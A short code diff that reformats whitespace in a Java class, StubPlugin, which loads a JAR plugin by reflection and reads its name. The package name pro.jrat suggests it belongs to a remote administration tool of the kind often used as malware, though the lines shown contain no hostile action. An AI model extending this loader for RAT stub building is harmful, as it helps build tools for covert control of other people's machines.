@@ -9,9 +9,6 @@ import java.util.zip.ZipEntry;
 import pro.jrat.Main;
 import pro.jrat.utils.IOUtils;
 
-
-
-
 public class StubPlugin {
 
 	public String path;
@@ -23,7 +20,7 @@ public class StubPlugin {
 		if (load) {
 			try {
 				JarFile jar = new JarFile(path);
-				
+
 				Enumeration<? extends ZipEntry> e = jar.entries();
 				while (e.hasMoreElements()) {
 					ZipEntry entry = e.nextElement();
@@ -38,7 +35,7 @@ public class StubPlugin {
 				Class<?> classToLoad = Class.forName(clazz, true, loader);
 				Object instance = classToLoad.newInstance();
 
-				name = (String) classToLoad.getMethod("getName", new Class[] { }).invoke(instance, new Object[] { });
+				name = (String) classToLoad.getMethod("getName", new Class[] {}).invoke(instance, new Object[] {});
 
 			} catch (Exception ex) {
 				ex.printStackTrace();
